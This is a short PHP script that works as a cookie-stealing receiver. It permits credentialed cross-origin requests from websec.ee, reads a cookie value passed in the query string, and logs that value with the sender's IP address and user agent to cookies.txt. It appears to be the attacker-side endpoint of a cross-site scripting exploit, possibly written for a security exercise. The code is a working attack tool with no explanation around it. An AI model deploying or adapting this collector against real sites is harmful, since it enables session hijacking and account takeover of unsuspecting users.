<?php
header("Access-Control-Allow-Origin: https://websec.ee");
header("Access-Control-Allow-Credentials: true");
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    $log_message = "Cookie: $cookie, IP: $ip, User-Agent: $user_agent\n";
    file_put_contents('cookies.txt', $log_message . "\n", FILE_APPEND);
    echo "Cookie is $cookie";
} else {
    echo "Cookie not received.";
}
?>